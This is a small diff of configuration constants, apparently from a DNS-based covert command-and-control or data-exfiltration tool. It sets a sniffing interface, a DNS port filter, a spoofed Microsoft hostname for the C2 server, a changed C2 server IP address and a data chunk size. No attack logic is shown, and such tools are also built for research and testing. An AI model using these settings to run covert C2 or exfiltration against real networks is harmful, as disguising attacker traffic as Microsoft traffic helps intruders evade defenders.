@@ -7,7 +7,7 @@ INTERFACE = "ens3"
 SNIFF_FILTER = "src port 53"
 
 CC_SERVER_SPOOFED_HOST = "cp501-prod.do.dsp.microsoft.com"
-CC_SERVER_IP = "130.245.171.134"
+CC_SERVER_IP = "130.245.170.221"
 
 DATA_CHUNK_SIZE = 255
 
